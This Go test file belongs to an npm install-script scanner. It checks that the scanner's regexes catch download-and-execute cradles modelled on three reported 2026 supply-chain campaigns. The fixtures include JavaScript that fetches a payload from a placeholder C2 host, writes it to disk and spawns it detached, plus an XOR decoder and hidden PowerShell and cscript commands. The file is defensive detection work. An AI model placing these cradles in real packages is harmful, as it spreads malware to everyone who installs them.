package installsurface

import "testing"

// OPU-34: found via a true-positive generalization sweep — faithful
// structural reproductions of three independently-disclosed 2026 npm
// campaigns (axios/plain-crypto-js - UNC1069/Sapphire Sleet, March 2026;
// Mastra/easy-day-js - Sapphire Sleet, June 2026; a dependency-confusion
// cluster - Yandex-linked, non-DPRK, May 2026) run through the OPU-32
// binary. VC-002e (obfuscation+exec) generalized cleanly, 3 for 3.
// VC-002f (the cradle check, critical/block) generalized 0 for 3, for two
// distinct structural reasons fixed here.

// TestAsyncCradleWiderCallbackBody covers Gap A: asyncCradleRe's original
// window stopped at the first semicolon after the fetch call, which
// excludes a callback with more than one statement before the actual
// spawn — the norm in real code, not the exception. Confirmed on Mastra
// and the dependency-confusion cluster, both shaped like:
// https.get(url, (res) => { let x; res.on(...); res.on('end', () => {
// ...; spawn(...) }); }).
func TestAsyncCradleWiderCallbackBody(t *testing.T) {
	positives := []string{
		// The exact Mastra shape: several statements before the spawn.
		`https.get(c2, (res) => {
			let body = '';
			res.on('data', (chunk) => { body += chunk; });
			res.on('end', () => {
				const dest = path.join(os.homedir(), 'x.js');
				fs.writeFileSync(dest, body);
				spawn(process.execPath, [dest], { detached: true }).unref();
			});
		});`,
		// The dependency-confusion cluster's shape.
		`https.get(C2, (res) => {
			let chunks = [];
			res.on('data', (c) => chunks.push(c));
			res.on('end', () => {
				const payload = Buffer.concat(chunks);
				fs.writeFileSync(dest, payload);
				spawn(process.execPath, [dest], { detached: true }).unref();
			});
		});`,
	}
	for _, text := range positives {
		if !scanHasCap(text, CapCradle) {
			t.Errorf("expected CapCradle for multi-statement callback shape: %q", text)
		}
	}

	// esbuild's real install.js shape (Decision D-28's stated FP target):
	// the exec call is in a COMPLETELY SEPARATE function, ~1,544 characters
	// after the fetch call in the real file. Simulated here at a
	// comparable distance with unrelated filler between them.
	//
	// Review note (independent verification of this patch): at this
	// distance the 1500-byte filler alone pushes the exec call outside
	// asyncCradleCandidateRe's 1,000-char capture window, so this case
	// passes on window-distance exclusion and never reaches
	// namedFunctionDeclRe at all — mutation-tested by removing the
	// named-function rejection in scanCaps and confirming this assertion
	// still passed. It remains a legitimate regression (the real esbuild
	// file must not block), but it is NOT proof of the named-function
	// structural filter the patch actually introduces. That proof — a
	// same-shape candidate whose span falls WITHIN the window and is
	// rejected only because of the named-function check — lives in
	// TestEsbuildInstallerNamedFunctionExcludesCradle in
	// esbuild_regression_test.go, against the real (901-char, no filler)
	// esbuildLikeInstallJS fixture.
	esbuildShape := `function fetch(url) {
		return new Promise((resolve, reject) => {
			https.get(url, (res) => {
				if (res.statusCode !== 200) return reject(new Error("bad"));
				let chunks = [];
				res.on("data", (chunk) => chunks.push(chunk));
				res.on("end", () => resolve(Buffer.concat(chunks)));
			}).on("error", reject);
		});
	}
	` + string(make([]byte, 1500)) + `
	function installUsingNPM(pkg) {
		child_process.execSync("npm install " + pkg, { stdio: "pipe" });
	}`
	if scanHasCap(esbuildShape, CapCradle) {
		t.Error("did not expect CapCradle for esbuild's separate-function shape")
	}
}

// TestInterpreterSpawnCommandString covers Gap B: interpreterSpawnRe only
// matched spawn/spawnSync with the interpreter as an ISOLATED literal
// argument. Axios/plain-crypto-js's real technique is execSync with a
// shell command-LINE STRING containing the interpreter name as a
// substring — wrong function name and wrong argument shape, both missed.
func TestInterpreterSpawnCommandString(t *testing.T) {
	positives := []string{
		// The exact axios/plain-crypto-js shape.
		"child_process.execSync(`cscript.exe //nologo //B \"" + `${vbsPath}` + "\"`, { windowsHide: true });",
		// Plain exec with a command string.
		`exec('powershell -w hidden -ep bypass -file payload.ps1')`,
		// execFileSync, still an isolated literal (pre-existing shape, must
		// still match).
		`execFileSync('cmd.exe', ['/c', 'dir'])`,
	}
	// interpreterSpawnRe itself (not the full CapCradle co-occurrence) is
	// what needs to match; test it via the co-occurrence path same as
	// opu32_test.go, pairing with a decode call so CapObfuscation is set.
	for _, text := range positives {
		withObfuscation := `String.fromCharCode(a ^ b); ` + text
		if !scanHasCap(withObfuscation, CapCradle) {
			t.Errorf("expected CapCradle (decode-then-interpreter-spawn) for: %q", text)
		}
	}

	// A variable-built command (sudo-prompt's real pattern: an array is
	// .push()'d elsewhere, then passed as a bare identifier) must NOT
	// match — this further indirection is a known, documented residual
	// gap, not something OPU-34 claims to close.
	notMatched := `command.push('powershell.exe'); Node.child.exec(command, { encoding: 'utf-8' }, end);`
	withObfuscation := `String.fromCharCode(a ^ b); ` + notMatched
	if scanHasCap(withObfuscation, CapCradle) {
		t.Error("did not expect CapCradle for a variable-built exec command (documented residual gap)")
	}
}

// TestAxiosMastraDepconfReproductionsNowBlock is an end-to-end regression:
// faithful structural reproductions of all three real campaigns (IOCs
// replaced with inert RFC 5737 / .invalid placeholders) must now carry
// CapCradle, where before this patch none of the three did.
func TestAxiosMastraDepconfReproductionsNowBlock(t *testing.T) {
	axios := `
const child_process = require('child_process');
function _trans_1(x, r) {
  const E = r.split('').map(Number);
  return x.split('').map((ch, i) => {
    const S = ch.charCodeAt(0), a = E[7 * i * i % 10];
    return String.fromCharCode(S ^ a ^ 333);
  }).join('');
}
function detonateWindows(vbsPath) {
  child_process.execSync(` + "`cscript.exe //nologo //B \"${vbsPath}\"`" + `, { windowsHide: true });
}
`
	mastra := `
const https = require('https');
const { spawn } = require('child_process');
function _decode(b64) { return Buffer.from(b64, 'base64').toString('utf8'); }
https.get(c2, (res) => {
  let body = '';
  res.on('data', (chunk) => { body += chunk; });
  res.on('end', () => {
    fs.writeFileSync(dest, body);
    spawn(process.execPath, [dest], { detached: true }).unref();
  });
});
`
	depconf := `
const https = require('https');
const { spawn } = require('child_process');
function _d(b64) { return Buffer.from(b64, 'base64').toString('utf8'); }
https.get(C2, (res) => {
  let chunks = [];
  res.on('data', (c) => chunks.push(c));
  res.on('end', () => {
    fs.writeFileSync(dest, Buffer.concat(chunks));
    spawn(process.execPath, [dest], { detached: true }).unref();
  });
});
`
	for name, text := range map[string]string{"axios": axios, "mastra": mastra, "depconf": depconf} {
		if !scanHasCap(text, CapCradle) {
			t.Errorf("expected CapCradle for %s reproduction after OPU-34", name)
		}
	}
}
